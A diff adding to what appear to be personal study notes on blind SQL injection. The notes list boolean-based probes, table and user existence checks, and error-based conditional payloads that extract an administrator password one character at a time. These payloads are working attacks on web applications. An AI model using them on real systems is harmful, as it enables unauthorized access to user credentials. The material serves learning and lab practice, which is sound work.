@@ -4,10 +4,24 @@ in blind sql we can see the data but we can manipulate it to conclude the data
 *\ We can find some data from Cookies:
     SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 
+*\ Test if there a Blind SQL:
+   ' AND 1 = 1  => return normal response
+   ' and 1 = 2  => return abnormal response
 
+*\ Table existance 
+   ' and (select 'a' from users limit 1) = 'a
+
+*\ Verify user existance 
+   ' and (select distinct('a') from users where username = 'administrator') = 'a
+ 
 *\ Test response:
     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
      -> if return success that mean the first caracter is greater then 'm'
      -> else its not
 
 
+*\ Find data using error messages:
+    token='xyz' and (select case when 1=2 then 1/0 else 'a' end) = 'a  ->  return true
+    token='xyz' and (select case when 1=1 then 1/0 else 'a' end) = 'a  ->  return zero division error
+    Example:
+      token='xyz' and (select case when (username = 'administrator' and substring(password, 1, 1) > 'm') then 1/0 else 'a' end from users) = 'a 
